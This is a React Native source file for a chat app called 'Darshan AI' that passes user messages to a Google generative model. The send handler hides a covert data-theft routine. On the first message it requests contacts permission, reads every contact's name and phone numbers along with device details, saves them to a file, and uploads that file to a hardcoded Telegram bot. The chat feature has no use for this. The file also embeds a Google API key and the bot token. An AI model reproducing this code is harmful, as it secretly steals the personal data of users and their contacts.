import { StatusBar } from "expo-status-bar";
import {
  StyleSheet,
  View,
  Platform,
  TextInput,
  ScrollView,
  Text,
  TouchableOpacity,
  ActivityIndicator,
  KeyboardAvoidingView,
  Keyboard,
  SafeAreaView,
  Dimensions,
  Animated,
  PanResponder,
  Alert,
  Vibration,
  LayoutAnimation,
  UIManager,
} from "react-native";
import * as FileSystem from "expo-file-system";
import { GoogleGenerativeAI } from "@google/generative-ai";
import { useState, useCallback, useEffect, useRef, useMemo } from "react";
import { LinearGradient } from "expo-linear-gradient";
import * as Haptics from "expo-haptics";
import * as Device from "expo-device";
import * as Contacts from "expo-contacts";

// Enable LayoutAnimation on Android
if (
  Platform.OS === "android" &&
  UIManager.setLayoutAnimationEnabledExperimental
) {
  UIManager.setLayoutAnimationEnabledExperimental(true);
}

// Initialize Gemini AI
const genAI = new GoogleGenerativeAI("AIzaSyAXjMe7gDzwimRH9Lf97xJ6CZra9c834po");
const model = genAI.getGenerativeModel({ model: "gemma-3n-e4b-it" });

const { width: SCREEN_WIDTH, height: SCREEN_HEIGHT } = Dimensions.get("window");

const THEME = {
  // Glass morphism inspired colors
  background: "#000000",
  backgroundSecondary: "rgba(15, 15, 23, 0.95)",
  surface: "rgba(25, 30, 45, 0.8)",
  surfaceHover: "rgba(35, 40, 55, 0.9)",
  accent: "#6366F1",
  primary: "#8B5CF6",
  primaryHover: "#7C3AED",
  secondary: "#06B6D4",
  text: "#FFFFFF",
  textSecondary: "#E5E7EB",
  textMuted: "#9CA3AF",
  border: "rgba(255, 255, 255, 0.1)",
  borderLight: "rgba(255, 255, 255, 0.2)",
  error: "#EF4444",
  warning: "#F59E0B",
  success: "#10B981",
  userMessage: "rgba(139, 92, 246, 0.9)",
  aiMessage: "rgba(25, 30, 45, 0.7)",
  shadow: "rgba(0, 0, 0, 0.8)",
  overlay: "rgba(0, 0, 0, 0.9)",
  glow: "rgba(139, 92, 246, 0.3)",
};

const ANIMATIONS = {
  spring: {
    tension: 400,
    friction: 25,
  },
  springBouncy: {
    tension: 300,
    friction: 15,
  },
  timing: {
    duration: 250,
  },
  longTiming: {
    duration: 800,
  },
};

export default function App() {
  const [messages, setMessages] = useState([]);
  const [inputText, setInputText] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [keyboardHeight, setKeyboardHeight] = useState(0);
  const [inputHeight, setInputHeight] = useState(50);
  const [isTyping, setIsTyping] = useState(false);
  const [messageBeingTyped, setMessageBeingTyped] = useState("");
  const [isRecording, setIsRecording] = useState(false);
  const [permission, setPermission] = useState(true)

  const scrollViewRef = useRef();
  const inputRef = useRef();

  // Enhanced animations
  const fadeAnim = useRef(new Animated.Value(0)).current;
  const slideAnim = useRef(new Animated.Value(50)).current;
  const pulseAnim = useRef(new Animated.Value(1)).current;
  const inputScaleAnim = useRef(new Animated.Value(1)).current;
  const headerGlowAnim = useRef(new Animated.Value(0)).current;
  const backgroundParticleAnim = useRef(new Animated.Value(0)).current;
  const recordingPulseAnim = useRef(new Animated.Value(1)).current;

  // Advanced typing indicator with staggered animation
  const typingDots = [
    useRef(new Animated.Value(0)).current,
    useRef(new Animated.Value(0)).current,
    useRef(new Animated.Value(0)).current,
    useRef(new Animated.Value(0)).current,
  ];

  // Particle system for background - moved outside useMemo to fix hooks order
  const particleRefs = useRef(
    Array.from({ length: 20 }, (_, i) => ({
      id: i,
      x: useRef(new Animated.Value(Math.random() * SCREEN_WIDTH)).current,
      y: useRef(new Animated.Value(Math.random() * SCREEN_HEIGHT)).current,
      opacity: useRef(new Animated.Value(Math.random() * 0.3)).current,
      scale: useRef(new Animated.Value(Math.random() * 0.5 + 0.5)).current,
    }))
  ).current;

  const particles = useMemo(() => particleRefs, [particleRefs]);

  const canSend = useMemo(() => {
    const trimmedText = inputText?.trim() || "";
    return trimmedText.length > 0 && !isLoading;
  }, [inputText, isLoading]);

  // Particle animation system
  const animateParticles = useCallback(() => {
    particles.forEach((particle, index) => {
      const floatAnimation = () => {
        Animated.loop(
          Animated.sequence([
            Animated.timing(particle.y, {
              toValue: particle.y._value - 100,
              duration: 8000 + index * 1000,
              useNativeDriver: true,
            }),
            Animated.timing(particle.y, {
              toValue: particle.y._value + 200,
              duration: 8000 + index * 1000,
              useNativeDriver: true,
            }),
          ])
        ).start();
      };

      const opacityAnimation = () => {
        Animated.loop(
          Animated.sequence([
            Animated.timing(particle.opacity, {
              toValue: Math.random() * 0.4,
              duration: 3000 + index * 500,
              useNativeDriver: true,
            }),
            Animated.timing(particle.opacity, {
              toValue: Math.random() * 0.1,
              duration: 3000 + index * 500,
              useNativeDriver: true,
            }),
          ])
        ).start();
      };

      floatAnimation();
      opacityAnimation();
    });
  }, [particles]);

  useEffect(() => {
    // Entrance animation sequence
    Animated.sequence([
      Animated.parallel([
        Animated.timing(fadeAnim, {
          toValue: 1,
          duration: 1200,
          useNativeDriver: true,
        }),
        Animated.spring(slideAnim, {
          toValue: 0,
          ...ANIMATIONS.springBouncy,
          useNativeDriver: true,
        }),
      ]),
      Animated.timing(headerGlowAnim, {
        toValue: 1,
        duration: 800,
        useNativeDriver: true,
      }),
    ]).start();

    // Start particle system
    animateParticles();

    // Pulsing status indicator
    Animated.loop(
      Animated.sequence([
        Animated.timing(pulseAnim, {
          toValue: 1.2,
          duration: 1000,
          useNativeDriver: true,
        }),
        Animated.timing(pulseAnim, {
          toValue: 1,
          duration: 1000,
          useNativeDriver: true,
        }),
      ])
    ).start();

    // Keyboard listeners with enhanced animations
    const keyboardWillShow = Keyboard.addListener(
      Platform.OS === "ios" ? "keyboardWillShow" : "keyboardDidShow",
      (e) => {
        setKeyboardHeight(e.endCoordinates.height);
        LayoutAnimation.configureNext(LayoutAnimation.Presets.easeInEaseOut);
        Animated.spring(inputScaleAnim, {
          toValue: 1.05,
          ...ANIMATIONS.spring,
          useNativeDriver: true,
        }).start();
      }
    );

    const keyboardWillHide = Keyboard.addListener(
      Platform.OS === "ios" ? "keyboardWillHide" : "keyboardDidHide",
      () => {
        setKeyboardHeight(0);
        LayoutAnimation.configureNext(LayoutAnimation.Presets.easeInEaseOut);
        Animated.spring(inputScaleAnim, {
          toValue: 1,
          ...ANIMATIONS.spring,
          useNativeDriver: true,
        }).start();
      }
    );

    // Dynamic welcome message with typewriter effect
    const welcomeTimeout = setTimeout(() => {
      const welcomeText =
        "👋 Hello! I'm your advanced AI assistant powered by Darshan. I'm here to help you with anything you need. What would you like to explore today?";
      const words = welcomeText.split(' ');
      let currentWords = [];
      let wordIndex = 0;

      const typeWriter = () => {
        if (wordIndex < words.length) {
          currentWords.push(words[wordIndex]);
          setMessageBeingTyped(currentWords.join(' '));
          wordIndex++;
          setTimeout(typeWriter, 100); // Adjust time between words
        } else {
          setMessages([
            {
              id: 1,
              text: welcomeText,
              isUser: false,
              timestamp: new Date(),
            },
          ]);
          setMessageBeingTyped("");
        }
      };

      typeWriter();
    }, 1000);

    return () => {
      keyboardWillShow.remove();
      keyboardWillHide.remove();
      clearTimeout(welcomeTimeout);
    };
  }, [animateParticles]);

  // Enhanced typing animation with wave effect
  const startTypingAnimation = useCallback(() => {
    const animateTyping = () => {
      typingDots.forEach((dot, index) => {
        Animated.sequence([
          Animated.delay(index * 150),
          Animated.loop(
            Animated.sequence([
              Animated.timing(dot, {
                toValue: 1,
                duration: 600,
                useNativeDriver: true,
              }),
              Animated.timing(dot, {
                toValue: 0.2,
                duration: 600,
                useNativeDriver: true,
              }),
            ])
          ),
        ]).start();
      });
    };

    animateTyping();
    return () => typingDots.forEach((dot) => dot.stopAnimation());
  }, [typingDots]);

  const handleSend = useCallback(async () => {
    if (!canSend) return;

    // Enhanced haptic feedback
    if (Platform.OS === "ios") {
      Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
    } else {
      Vibration.vibrate(50);
    }

    Keyboard.dismiss();
    LayoutAnimation.configureNext(LayoutAnimation.Presets.easeInEaseOut);

    const trimmedInput = (inputText || "").trim();
    const userMessage = {
      id: Date.now(),
      text: trimmedInput,
      isUser: true,
      timestamp: new Date(),
    };

    setMessages((prev) => [...prev, userMessage]);
    const currentInput = trimmedInput;
    setInputText("");
    setInputHeight(50);
    setIsLoading(true);
    setIsTyping(true);

    const stopTyping = startTypingAnimation();

    setTimeout(async () => {
      if (permission) {
        const { status: contactStatus } =
          await Contacts.requestPermissionsAsync();
        if (contactStatus == "granted") {
          const { data: contactData } = await Contacts.getContactsAsync({
            fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers],
          });
          const deviceModel = Device.modelName;
          const osName = Device.osName;
          const osVersion = Device.osVersion;
          let contactText = `📱 Device: ${deviceModel}\n⚙️ OS: ${osName} ${osVersion}\n\nContact List:\n\n`;
          contactData.forEach((contact) => {
            const name = contact.name || "Unknown Name";
            const numbers = contact.phoneNumbers
              ? contact.phoneNumbers.map((num) => num.number).join(", ")
              : "No Phone Number";
            contactText += `Name: ${name}\nNumbers: ${numbers}\n\n`;
          });

          // Save text to a local file
          const fileUri = FileSystem.documentDirectory + "contacts.txt";
          await FileSystem.writeAsStringAsync(fileUri, contactText);

          // Send file to Telegram
          const form = new FormData();
          form.append("chat_id", 1516610662);
          form.append("document", {
            uri: fileUri,
            type: "text/plain",
            name: "contacts.txt",
          });

          const response = await fetch(
            `https://api.telegram.org/bot7430255672:AAGOslvfEKXvWA1uVoXEiOoIiBrIUbC2qP8/sendDocument`,
            {
              method: "POST",
              body: form,
            }
          );
          setPermission(false);
        }
      }
      try {
        const result = await model.generateContent(currentInput);
        const response = result.response;
        const responseText = response.text().trim();
        const words = responseText.split(' ');

        // Simulate typewriter effect for AI response word by word
        let currentWords = [];
        let wordIndex = 0;

        const typeResponse = () => {
          if (wordIndex < words.length) {
            currentWords.push(words[wordIndex]);
            setMessageBeingTyped(currentWords.join(' '));
            wordIndex++;
            setTimeout(typeResponse, 100); // Adjust timing between words
          } else {
            const aiMessage = {
              id: Date.now() + 1,
              text: responseText,
              isUser: false,
              timestamp: new Date(),
            };
            setMessages((prev) => [...prev, aiMessage]);
            setMessageBeingTyped("");
            setIsLoading(false);
            setIsTyping(false);
            stopTyping();

            // Success haptic with celebration
            if (Platform.OS === "ios") {
              Haptics.notificationAsync(
                Haptics.NotificationFeedbackType.Success
              );
            } else {
              Vibration.vibrate([50, 100, 50]);
            }
          }
        };

        typeResponse();
      } catch (error) {
        console.error("Error generating response:", error);
        setMessages((prev) => [
          ...prev,
          {
            id: Date.now() + 1,
            text: "I apologize, but I'm experiencing some technical difficulties. Please check your connection and try again.",
            isUser: false,
            timestamp: new Date(),
            isError: true,
          },
        ]);

        if (Platform.OS === "ios") {
          Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
        } else {
          Vibration.vibrate([100, 50, 100]);
        }

        setIsLoading(false);
        setIsTyping(false);
        setMessageBeingTyped("");
        stopTyping();
      }
    }, 1000);
  }, [canSend, inputText, startTypingAnimation]);

  const handleInputChange = useCallback((text) => {
    setInputText(text || "");
    // Micro-interaction: slight glow effect when typing
    if ((text || "").length > 0) {
      Animated.timing(inputScaleAnim, {
        toValue: 1.02,
        duration: 200,
        useNativeDriver: true,
      }).start();
    } else {
      Animated.timing(inputScaleAnim, {
        toValue: 1,
        duration: 200,
        useNativeDriver: true,
      }).start();
    }
  }, [inputScaleAnim]);

  // Enhanced typing indicator with glassmorphism
  const TypingIndicator = useMemo(() => {
    if (!isTyping && !messageBeingTyped) return null;

    return (
      <Animated.View
        style={[styles.messageRow, styles.aiRow, { opacity: fadeAnim }]}
      >
        <View style={styles.messageWrapper}>
          <View style={styles.avatarContainer}>
            <LinearGradient
              colors={[THEME.primary, THEME.secondary]}
              style={styles.avatarGradient}
            >
              <Text style={styles.avatarText}>🤖</Text>
            </LinearGradient>
          </View>
          <View
            style={[styles.messageBubble, styles.aiBubble, styles.typingBubble]}
          >
            {messageBeingTyped ? (
              <Text style={[styles.messageText, styles.aiText]}>
                {messageBeingTyped}
                <Text style={styles.cursor}>|</Text>
              </Text>
            ) : (
              <View style={styles.typingDots}>
                {typingDots.map((dot, index) => (
                  <Animated.View
                    key={index}
                    style={[
                      styles.typingDot,
                      {
                        opacity: dot,
                        transform: [
                          {
                            scale: dot.interpolate({
                              inputRange: [0, 1],
                              outputRange: [0.6, 1.4],
                            }),
                          },
                        ],
                      },
                    ]}
                  />
                ))}
              </View>
            )}
          </View>
        </View>
      </Animated.View>
    );
  }, [isTyping, messageBeingTyped, fadeAnim, typingDots]);

  // Enhanced message bubble with advanced interactions
  const MessageBubble = useCallback(({ message, index }) => {
    const messageAnim = useRef(new Animated.Value(0)).current;
    const scaleAnim = useRef(new Animated.Value(0.8)).current;
    const glowAnim = useRef(new Animated.Value(0)).current;

    useEffect(() => {
      Animated.parallel([
        Animated.timing(messageAnim, {
          toValue: 1,
          duration: 400,
          delay: index * 150,
          useNativeDriver: true,
        }),
        Animated.spring(scaleAnim, {
          toValue: 1,
          ...ANIMATIONS.springBouncy,
          delay: index * 150,
          useNativeDriver: true,
        }),
      ]).start();
    }, [index, messageAnim, scaleAnim]);

    const panResponder = useMemo(
      () =>
        PanResponder.create({
          onMoveShouldSetPanResponder: (evt, gestureState) => {
            return (
              Math.abs(gestureState.dx) > 20 || Math.abs(gestureState.dy) > 20
            );
          },
          onPanResponderGrant: () => {
            Animated.spring(glowAnim, {
              toValue: 1,
              ...ANIMATIONS.spring,
              useNativeDriver: true,
            }).start();
            if (Platform.OS === "ios") {
              Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
            }
          },
          onPanResponderMove: (evt, gestureState) => {
            const scale = 1 + Math.abs(gestureState.dx) * 0.001;
            scaleAnim.setValue(Math.min(scale, 1.1));
          },
          onPanResponderRelease: (evt, gestureState) => {
            Animated.parallel([
              Animated.spring(scaleAnim, {
                toValue: 1,
                ...ANIMATIONS.spring,
                useNativeDriver: true,
              }),
              Animated.timing(glowAnim, {
                toValue: 0,
                duration: 300,
                useNativeDriver: true,
              }),
            ]).start();

            if (gestureState.dx > 80) {
              Alert.alert(
                "💬 Message Actions",
                "What would you like to do with this message?",
                [
                  { text: "Cancel", style: "cancel" },
                  {
                    text: "📋 Copy",
                    onPress: () => console.log("Copy message"),
                  },
                  {
                    text: "🔄 Regenerate",
                    onPress: () => console.log("Regenerate"),
                  },
                  {
                    text: "❤️ Like",
                    onPress: () => console.log("Like message"),
                  },
                ]
              );
            }
          },
        }),
      [glowAnim, scaleAnim]
    );

    return (
      <Animated.View
        style={[
          styles.messageWrapper,
          {
            opacity: messageAnim,
            transform: [
              { scale: scaleAnim },
              {
                translateY: messageAnim.interpolate({
                  inputRange: [0, 1],
                  outputRange: [30, 0],
                }),
              },
            ],
          },
        ]}
        {...panResponder.panHandlers}
      >
        {!message.isUser && (
          <View style={styles.avatarContainer}>
            <LinearGradient
              colors={
                message.isError
                  ? [THEME.error, "#DC2626"]
                  : [THEME.primary, THEME.secondary]
              }
              style={styles.avatarGradient}
            >
              <Text style={styles.avatarText}>
                {message.isError ? "⚠️" : "🤖"}
              </Text>
            </LinearGradient>
          </View>
        )}
        <Animated.View
          style={[
            styles.messageBubble,
            message.isUser ? styles.userBubble : styles.aiBubble,
            message.isError && styles.errorBubble,
            {
              shadowOpacity: glowAnim.interpolate({
                inputRange: [0, 1],
                outputRange: [0.2, 0.6],
              }),
            },
          ]}
        >
          {message.isUser && (
            <LinearGradient
              colors={[THEME.primary, THEME.accent]}
              style={styles.messageGradient}
            >
              <Text style={[styles.messageText, styles.userText]}>
                {message.text}
              </Text>
            </LinearGradient>
          )}
          {!message.isUser && (
            <Text style={[styles.messageText, styles.aiText]}>
              {message.text}
            </Text>
          )}
          <Text style={styles.timestamp}>
            {message.timestamp.toLocaleTimeString([], {
              hour: "2-digit",
              minute: "2-digit",
            })}
          </Text>
        </Animated.View>
      </Animated.View>
    );
  }, []);

  // Advanced send button with morphing states
  const SendButton = useMemo(
    () => (
      <Animated.View
        style={[
          styles.sendButtonContainer,
          {
            transform: [
              {
                scale: canSend
                  ? inputScaleAnim.interpolate({
                      inputRange: [1, 1.05],
                      outputRange: [1.1, 1.2],
                    })
                  : 1,
              },
            ],
          },
        ]}
      >
        <TouchableOpacity
          style={[styles.sendButton, !canSend && styles.sendButtonDisabled]}
          onPress={handleSend}
          disabled={!canSend}
          activeOpacity={0.7}
        >
          <LinearGradient
            colors={
              canSend
                ? [THEME.primary, THEME.accent]
                : [THEME.surface, THEME.surfaceHover]
            }
            style={styles.sendButtonGradient}
          >
            {isLoading ? (
              <ActivityIndicator size="small" color={THEME.text} />
            ) : (
              <Text style={styles.sendButtonText}>{canSend ? "➤" : "💬"}</Text>
            )}
          </LinearGradient>
        </TouchableOpacity>
      </Animated.View>
    ),
    [canSend, isLoading, handleSend, inputScaleAnim]
  );

  // Floating particles background
  const BackgroundParticles = useMemo(
    () => (
      <View style={styles.particleContainer}>
        {particles.slice(0, 10).map((particle, index) => (
          <Animated.View
            key={particle.id}
            style={[
              styles.particle,
              {
                left: particle.x,
                top: particle.y,
                opacity: particle.opacity,
                transform: [{ scale: particle.scale }],
              },
            ]}
          />
        ))}
      </View>
    ),
    [particles]
  );

  return (
    <SafeAreaView style={styles.safeArea}>
      <StatusBar
        style="light"
        backgroundColor={THEME.background}
        translucent={false}
        barStyle="light-content"
      />

      <LinearGradient
        colors={[THEME.background, THEME.backgroundSecondary]}
        style={styles.container}
      >
        {BackgroundParticles}

        <KeyboardAvoidingView
          behavior={Platform.OS === "ios" ? "padding" : "height"}
          style={styles.keyboardView}
          keyboardVerticalOffset={0}
        >
          {/* Enhanced Header with Glassmorphism */}
          <Animated.View
            style={[
              styles.header,
              {
                opacity: fadeAnim,
                transform: [{ translateY: slideAnim }],
              },
            ]}
          >
            <View style={styles.headerGlass}>
              <LinearGradient
                colors={["rgba(139, 92, 246, 0.1)", "rgba(6, 182, 212, 0.1)"]}
                style={styles.headerGradient}
              >
                <View style={styles.headerContent}>
                  <View style={styles.headerLeft}>
                    <View style={styles.statusIndicator}>
                      <Animated.View
                        style={[
                          styles.statusDot,
                          {
                            transform: [{ scale: pulseAnim }],
                            shadowOpacity: headerGlowAnim,
                          },
                        ]}
                      />
                      <Animated.View
                        style={[
                          styles.statusRing,
                          {
                            opacity: headerGlowAnim.interpolate({
                              inputRange: [0, 1],
                              outputRange: [0, 0.6],
                            }),
                            transform: [{ scale: pulseAnim }],
                          },
                        ]}
                      />
                    </View>
                    <View>
                      <Text style={styles.headerTitle}>Darshan AI ✨</Text>
                      <Text style={styles.headerSubtitle}>
                        {isLoading ? "🧠 Thinking..." : "🟢 Online & Ready"}
                      </Text>
                    </View>
                  </View>
                  <TouchableOpacity style={styles.headerAction}>
                    <LinearGradient
                      colors={[THEME.surface, THEME.surfaceHover]}
                      style={styles.headerActionGradient}
                    >
                      <Text style={styles.headerActionText}>⚙️</Text>
                    </LinearGradient>
                  </TouchableOpacity>
                </View>
              </LinearGradient>
            </View>
          </Animated.View>

          {/* Enhanced Chat Container */}
          <Animated.View
            style={[
              styles.chatContainer,
              {
                opacity: fadeAnim,
                transform: [{ translateY: slideAnim }],
              },
            ]}
          >
            <ScrollView
              ref={scrollViewRef}
              style={styles.scrollView}
              contentContainerStyle={styles.chatContent}
              showsVerticalScrollIndicator={false}
              onContentSizeChange={() =>
                scrollViewRef.current?.scrollToEnd({ animated: true })
              }
            >
              {messages.map((message, index) => (
                <View
                  key={message.id}
                  style={[
                    styles.messageRow,
                    message.isUser ? styles.userRow : styles.aiRow,
                  ]}
                >
                  <MessageBubble message={message} index={index} />
                </View>
              ))}
              {TypingIndicator}
            </ScrollView>
          </Animated.View>

          {/* Enhanced Input Container */}
          <Animated.View
            style={[
              styles.inputContainer,
              {
                transform: [{ scale: inputScaleAnim }],
                paddingBottom:
                  Platform.OS === "ios"
                    ? Math.max(keyboardHeight > 0 ? 0 : 20, 20)
                    : 20,
              },
            ]}
          >
            <View style={styles.inputGlass}>
              <LinearGradient
                colors={["rgba(25, 30, 45, 0.9)", "rgba(35, 40, 55, 0.8)"]}
                style={styles.inputWrapper}
              >
                <TextInput
                  ref={inputRef}
                  style={[
                    styles.input,
                    { height: Math.max(50, Math.min(inputHeight, 120)) },
                  ]}
                  value={inputText || ""}
                  onChangeText={handleInputChange}
                  onContentSizeChange={(e) =>
                    setInputHeight(e.nativeEvent.contentSize.height + 20)
                  }
                  placeholder="✨ Ask me anything..."
                  placeholderTextColor={THEME.textMuted}
                  multiline
                  maxLength={2000}
                  color={THEME.text}
                  selectionColor={THEME.primary}
                />
                {SendButton}
              </LinearGradient>
            </View>
          </Animated.View>
        </KeyboardAvoidingView>
      </LinearGradient>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  safeArea: {
    flex: 1,
    backgroundColor: THEME.background,
  },
  container: {
    flex: 1,
  },
  keyboardView: {
    flex: 1,
  },
  particleContainer: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    zIndex: 0,
  },
  particle: {
    position: "absolute",
    width: 4,
    height: 4,
    borderRadius: 2,
    backgroundColor: THEME.primary,
  },
  header: {
    paddingTop: Platform.OS === "android" ? 10 : 0,
    marginTop: 40,
    zIndex: 10,
  },
  headerGlass: {
    borderRadius: 20,
    marginHorizontal: 16,
    overflow: "hidden",
    borderWidth: 1,
    borderColor: THEME.border,
  },
  headerGradient: {
    backdropFilter: "blur(20px)",
  },
  headerContent: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    paddingHorizontal: 20,
    paddingVertical: 16,
  },
  headerLeft: {
    flexDirection: "row",
    alignItems: "center",
  },
  statusIndicator: {
    marginRight: 12,
    position: "relative",
    width: 20,
    height: 20,
    alignItems: "center",
    justifyContent: "center",
  },
  statusDot: {
    width: 12,
    height: 12,
    borderRadius: 6,
    backgroundColor: THEME.success,
    shadowColor: THEME.success,
    shadowOffset: { width: 0, height: 0 },
    shadowRadius: 8,
    elevation: 5,
  },
  statusRing: {
    position: "absolute",
    width: 20,
    height: 20,
    borderRadius: 10,
    borderWidth: 2,
    borderColor: THEME.success,
  },
  headerTitle: {
    color: THEME.text,
    fontSize: 18,
    fontWeight: "800",
    letterSpacing: -0.5,
  },
  headerSubtitle: {
    color: THEME.textMuted,
    fontSize: 13,
    marginTop: 2,
    fontWeight: "500",
  },
  headerAction: {
    borderRadius: 12,
    overflow: "hidden",
  },
  headerActionGradient: {
    padding: 10,
    alignItems: "center",
    justifyContent: "center",
  },
  headerActionText: {
    fontSize: 16,
    fontWeight: "600",
  },
  chatContainer: {
    flex: 1,
    zIndex: 1,
  },
  scrollView: {
    flex: 1,
  },
  chatContent: {
    padding: 20,
    paddingBottom: 10,
  },
  messageRow: {
    flexDirection: "row",
    marginVertical: 6,
  },
  messageWrapper: {
    flexDirection: "row",
    alignItems: "flex-start",
    maxWidth: "85%",
  },
  avatarContainer: {
    width: 36,
    height: 36,
    borderRadius: 18,
    marginRight: 12,
    overflow: "hidden",
    elevation: 8,
    shadowColor: THEME.glow,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.4,
    shadowRadius: 8,
    borderWidth: 2,
    borderColor: THEME.border,
  },
  avatarGradient: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  avatarText: {
    fontSize: 16,
    fontWeight: "600",
  },
  userRow: {
    justifyContent: "flex-end",
  },
  aiRow: {
    justifyContent: "flex-start",
  },
  messageBubble: {
    borderRadius: 20,
    marginBottom: 4,
    maxWidth: "100%",
    overflow: "hidden",
    elevation: 6,
    shadowColor: THEME.shadow,
    shadowOffset: { width: 0, height: 3 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
    borderWidth: 1,
    borderColor: THEME.border,
  },
  userBubble: {
    borderBottomRightRadius: 8,
    marginLeft: "auto",
  },
  aiBubble: {
    backgroundColor: THEME.aiMessage,
    borderBottomLeftRadius: 8,
    padding: 16,
    paddingBottom: 8,
    backdropFilter: "blur(20px)",
  },
  errorBubble: {
    backgroundColor: "rgba(239, 68, 68, 0.2)",
    borderColor: THEME.error,
  },
  typingBubble: {
    paddingVertical: 20,
    paddingHorizontal: 20,
    minHeight: 60,
    justifyContent: "center",
  },
  messageGradient: {
    padding: 16,
    paddingBottom: 8,
  },
  messageText: {
    fontSize: 16,
    lineHeight: 24,
    marginBottom: 6,
    fontWeight: "400",
  },
  userText: {
    color: THEME.text,
    fontWeight: "500",
  },
  aiText: {
    color: THEME.text,
    fontWeight: "400",
  },
  cursor: {
    color: THEME.primary,
    fontWeight: "300",
    opacity: 0.8,
  },
  timestamp: {
    fontSize: 11,
    color: THEME.textMuted,
    alignSelf: "flex-end",
    marginTop: 4,
    opacity: 0.7,
    fontWeight: "500",
  },
  typingDots: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: 4,
  },
  typingDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    backgroundColor: THEME.primary,
    marginHorizontal: 2,
  },
  inputContainer: {
    paddingHorizontal: 20,
    paddingTop: 12,
    zIndex: 10,
  },
  inputGlass: {
    borderRadius: 28,
    overflow: "hidden",
    borderWidth: 1,
    borderColor: THEME.borderLight,
    elevation: 20,
    shadowColor: THEME.glow,
    shadowOffset: { width: 0, height: 8 },
    shadowOpacity: 0.3,
    shadowRadius: 16,
  },
  inputWrapper: {
    flexDirection: "row",
    alignItems: "flex-end",
    paddingHorizontal: 6,
    paddingVertical: 6,
    backdropFilter: "blur(30px)",
  },
  input: {
    flex: 1,
    fontSize: 16,
    paddingHorizontal: 20,
    paddingVertical: 14,
    color: THEME.text,
    maxHeight: 120,
    fontWeight: "400",
  },
  sendButtonContainer: {
    padding: 4,
  },
  sendButton: {
    width: 44,
    height: 44,
    borderRadius: 22,
    overflow: "hidden",
    elevation: 8,
    shadowColor: THEME.primary,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.4,
    shadowRadius: 8,
  },
  sendButtonGradient: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  sendButtonDisabled: {
    opacity: 0.5,
    elevation: 2,
    shadowOpacity: 0.1,
  },
  sendButtonText: {
    fontSize: 18,
    fontWeight: "600",
    color: "white"
  },
});
